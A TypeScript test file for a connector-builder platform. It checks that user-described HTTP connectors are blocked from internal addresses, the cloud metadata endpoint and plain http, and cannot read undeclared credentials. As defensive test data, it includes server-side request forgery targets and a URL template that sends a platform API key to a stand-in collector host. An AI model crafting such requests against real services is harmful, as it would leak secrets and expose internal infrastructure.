import { describe, it, expect, vi } from "vitest";
import { validateNodeFrame, doorsForFrame, type NodeFrameDeclaration } from "@coreai/shared";
import { runConnector } from "./engine";
import { checkRecipeUrl, credentialProblems } from "./recipe-heart";
import { frameFromDeclaration, problemsWith } from "./architect-frames";

/**
 * The Node Frame filled in through the builder, rather than written as code.
 *
 * The bar is the whole point: a node an architect described has to clear the
 * same checks as one we wrote ourselves. These tests are mostly about the two
 * places where a description becomes a request our own server makes.
 */

const declaration = (over: Partial<NodeFrameDeclaration> = {}): NodeFrameDeclaration =>
  ({
    id: "acme.fetch",
    version: "1.0.0",
    job: "custom",
    label: "Get things from Acme",
    shortLabel: "Acme",
    description: "Looks things up in Acme.",
    provider: { name: "Acme", docsUrl: "https://acme.example/docs", apiVersion: "v1", lastVerified: "2026-08-21" },
    needs: {
      platform: [{ key: "ACME_API_KEY", label: "Acme key", kind: "api_key", help: "", required: true }],
      architect: [],
      business: [{ key: "topic", label: "What to look for", help: "", kind: "text", required: true }],
      accounts: []
    },
    produces: [{ key: "results", label: "What came back", kind: "list", required: true, sample: [] }],
    cost: { style: "per_call", estimateCents: 1, unit: "per call", billedTo: "business" },
    failure: { onError: "retry", maxRetries: 1, backoffMs: 1, neverRetry: [401], humanMessage: "Acme is down." },
    limits: { callsPerMinute: 30, callsPerDay: 500, concurrent: 2, pageSize: 25, maxPages: 3 },
    rules: {},
    health: { everyHours: 24, expectKeys: ["results"], severity: "degrades" },
    execution: "immediate",
    rollout: "canary",
    recipe: {
      method: "GET",
      url: "https://api.acme.example/v1/search",
      headers: { Authorization: "Bearer {{credentials.ACME_API_KEY}}" },
      query: { q: "{{config.topic}}" },
      resultsAt: "items"
    },
    ...over
  }) as NodeFrameDeclaration;

const freshBiz = () => `biz-${Math.random().toString(36).slice(2)}`;

/* ========================================================================== */

describe("a described connector cannot reach inside our own network", () => {
  it("refuses our own machine and our own containers", () => {
    for (const url of [
      "https://localhost/thing",
      "https://127.0.0.1/thing",
      "https://10.0.0.5/thing",
      "https://192.168.1.9/thing",
      "https://172.17.0.2/thing",
      "https://postgres.internal/thing"
    ]) {
      expect(checkRecipeUrl(url), url).not.toBeNull();
    }
  });

  it("refuses the cloud metadata address specifically", () => {
    // 169.254.169.254 hands out the machine's own credentials to anything on
    // the box that asks. A builder that could reach it is a builder that can
    // read our infrastructure from the inside.
    expect(checkRecipeUrl("https://169.254.169.254/latest/meta-data/")).not.toBeNull();
  });

  it("refuses plain http, because the key would go in the clear", () => {
    expect(checkRecipeUrl("http://api.acme.example/v1/search")).toContain("https://");
  });

  it("allows an ordinary service on the internet", () => {
    expect(checkRecipeUrl("https://api.notion.com/v1/databases/x/query")).toBeNull();
  });

  it("checks again at run time, because a placeholder can change the host", async () => {
    // {{config.region}} in the address means the host comes from whatever a
    // business typed into their own setup form.
    const frame = frameFromDeclaration(
      declaration({
        recipe: {
          method: "GET",
          url: "https://{{config.host}}/v1/search",
          headers: {},
          resultsAt: "items"
        }
      })
    );

    const result = await runConnector({
      contract: frame,
      businessId: freshBiz(),
      config: { ACME_API_KEY: "k", host: "169.254.169.254" }
    });

    expect(result.ok).toBe(false);
    expect(result.code).toBe("provider_error");
  });
});

describe("a described connector cannot read a key it never asked for", () => {
  it("refuses a recipe reaching for someone else's credential", () => {
    // Without this, {{credentials.OPENAI_API_KEY}} in a URL pointing at the
    // architect's own server walks off with the platform's key.
    const problems = credentialProblems(
      declaration({
        recipe: {
          method: "GET",
          url: "https://collect.example/?k={{credentials.OPENAI_API_KEY}}",
          resultsAt: "items"
        }
      })
    );
    expect(problems.join(" ")).toContain("OPENAI_API_KEY");
  });

  it("is happy with the key it declared", () => {
    expect(credentialProblems(declaration())).toEqual([]);
  });

  it("is stamped as the architect's, so the engine never hands it a platform key", () => {
    expect(frameFromDeclaration(declaration()).source).toBe("architect");
  });
});

describe("a described connector clears the same bar as one we wrote", () => {
  it("passes the very same validation", () => {
    expect(validateNodeFrame(frameFromDeclaration(declaration()))).toEqual([]);
    expect(problemsWith(declaration())).toEqual([]);
  });

  it("is refused for the same reasons ours would be", () => {
    const problems = problemsWith(
      declaration({
        produces: [{ key: "maybe", label: "Maybe", kind: "text", required: false, sample: "x" }]
      })
    );
    // "It worked" and "it did nothing" must never be the same answer, whoever
    // wrote the connector.
    expect(problems.join(" ")).toContain("at least one output must be required");
  });

  it("cannot pretend it worked", async () => {
    const original = globalThis.fetch;
    globalThis.fetch = (async () => new Response(JSON.stringify({ nothing: true }), { status: 200 })) as typeof fetch;

    const result = await runConnector({
      contract: frameFromDeclaration(declaration()),
      businessId: freshBiz(),
      config: { ACME_API_KEY: "k", topic: "x" }
    });
    globalThis.fetch = original;

    // The service answered, but without what the frame promised.
    expect(result.ok).toBe(true);
    expect(result.outputs.results).toEqual([]);
  });

  it("never touches the service during a rehearsal", async () => {
    const spy = vi.spyOn(globalThis, "fetch");
    const result = await runConnector({
      contract: frameFromDeclaration(declaration()),
      businessId: freshBiz(),
      isTest: true,
      config: {}
    });
    expect(result.ok).toBe(true);
    expect(spy).not.toHaveBeenCalled();
    spy.mockRestore();
  });
});

describe("the request it builds", () => {
  it("fills in what the business typed, and the key it declared", async () => {
    let seenUrl = "";
    let seenAuth = "";
    const original = globalThis.fetch;
    globalThis.fetch = (async (url: unknown, init: unknown) => {
      seenUrl = String(url);
      seenAuth = String((init as { headers?: Record<string, string> })?.headers?.Authorization ?? "");
      return new Response(JSON.stringify({ items: [1, 2, 3] }), { status: 200 });
    }) as typeof fetch;

    const result = await runConnector({
      contract: frameFromDeclaration(declaration()),
      businessId: freshBiz(),
      config: { ACME_API_KEY: "secret-key", topic: "dentists" }
    });
    globalThis.fetch = original;

    expect(seenUrl).toContain("q=dentists");
    expect(seenAuth).toBe("Bearer secret-key");
    expect(result.outputs.results).toEqual([1, 2, 3]);
  });

  it("counts what came back, so the spending ceiling works", async () => {
    const original = globalThis.fetch;
    globalThis.fetch = (async () =>
      new Response(JSON.stringify({ items: [1, 2, 3, 4, 5] }), { status: 200 })) as typeof fetch;

    const frame = frameFromDeclaration(
      declaration({ cost: { style: "per_result", estimateCents: 2, unit: "each", billedTo: "business" } })
    );
    const result = await runConnector({ contract: frame, businessId: freshBiz(), config: { ACME_API_KEY: "k" } });
    globalThis.fetch = original;

    expect(result.costCents).toBe(10);
  });

  it("leaves an empty answer out of the query rather than sending a blank", async () => {
    let seenUrl = "";
    const original = globalThis.fetch;
    globalThis.fetch = (async (url: unknown) => {
      seenUrl = String(url);
      return new Response(JSON.stringify({ items: [] }), { status: 200 });
    }) as typeof fetch;

    await runConnector({
      contract: frameFromDeclaration(declaration()),
      businessId: freshBiz(),
      config: { ACME_API_KEY: "k" }
    });
    globalThis.fetch = original;

    // Several providers read "?q=" as "search for nothing" rather than "no filter".
    expect(seenUrl).not.toContain("q=");
  });
});

describe("the doors a described node is born with", () => {
  const doors = doorsForFrame(frameFromDeclaration(declaration()));

  it("may fill in the settings the architect declared, and only those", () => {
    expect(doors.entry.fields).toEqual(["topic"]);
  });

  it("can never reach the key that signs the request", () => {
    // Credentials live in needs.platform, which is not part of this list by
    // construction rather than by remembering to exclude it.
    expect(doors.entry.fields).not.toContain("ACME_API_KEY");
  });

  it("knows what this particular step is for", () => {
    expect(doors.entry.job).toContain("Acme");
    expect(doors.exit.job).toContain("Acme");
  });
});

describe("finding the answer inside the reply", () => {
  it("follows a nested path like data.items", async () => {
    const original = globalThis.fetch;
    globalThis.fetch = (async () =>
      new Response(JSON.stringify({ data: { items: ["a", "b"] } }), { status: 200 })) as typeof fetch;

    const result = await runConnector({
      contract: frameFromDeclaration(
        declaration({
          recipe: { method: "GET", url: "https://api.acme.example/x", resultsAt: "data.items" }
        })
      ),
      businessId: freshBiz(),
      config: { ACME_API_KEY: "k" }
    });
    globalThis.fetch = original;

    expect(result.outputs.results).toEqual(["a", "b"]);
  });

  it("gives an empty list rather than nothing when the path is wrong", async () => {
    // A wrong path is the most likely mistake in this whole form. It must read
    // as "found nothing", never as a success carrying undefined into the next
    // step — which is the shape of every quiet half-failure.
    const original = globalThis.fetch;
    globalThis.fetch = (async () =>
      new Response(JSON.stringify({ data: { items: ["a"] } }), { status: 200 })) as typeof fetch;

    const result = await runConnector({
      contract: frameFromDeclaration(
        declaration({ recipe: { method: "GET", url: "https://api.acme.example/x", resultsAt: "wrong.path" } })
      ),
      businessId: freshBiz(),
      config: { ACME_API_KEY: "k" }
    });
    globalThis.fetch = original;

    expect(result.outputs.results).toEqual([]);
  });
});
